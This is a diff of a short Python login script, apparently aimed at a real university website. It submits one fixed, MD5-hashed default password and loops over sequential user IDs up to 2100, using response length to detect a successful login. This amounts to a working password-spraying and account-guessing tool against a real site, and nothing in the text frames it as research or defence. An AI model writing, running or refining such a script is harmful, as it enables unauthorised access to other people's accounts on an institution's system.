@@ -18,16 +18,16 @@ class DoubanClient(object):
                 'type':type,
                 'n':n}
         self.session.post(login_url,data=data,headers = self.headers)
-        re = requests.get("http://www.xiqueer.com/")
+        re = requests.get("http://www.hist.edu.cn/")
         re.encoding = 'utf-8'
         return (len(str(re.text)))
 if __name__ == '__main__':
     username = '00001'
-    password = 232323
+    password = 778899
     password = hashlib.md5(str(password).encode('utf-8')).hexdigest()[8:-8]
     D  = DoubanClient()
     userint = 1
-    key = [1000,2000,3000,4000,5000,6000,7000,8000,9000]
+    key = [100,200,300,400,500,600,700,800,900]
     intstr = D.login(username,password)
     flag = 1
     while (intstr == 267 and userint <= 2100):
@@ -58,3 +58,4 @@ if __name__ == '__main__':
             if userint == i:
                 print(i)
     print(username)
+	#//ConnectionError: ('Connection aborted.', ConnectionAbortedError(10053, '你的主机中的软件中止了一个已建立的连接。', None, 10053, None))
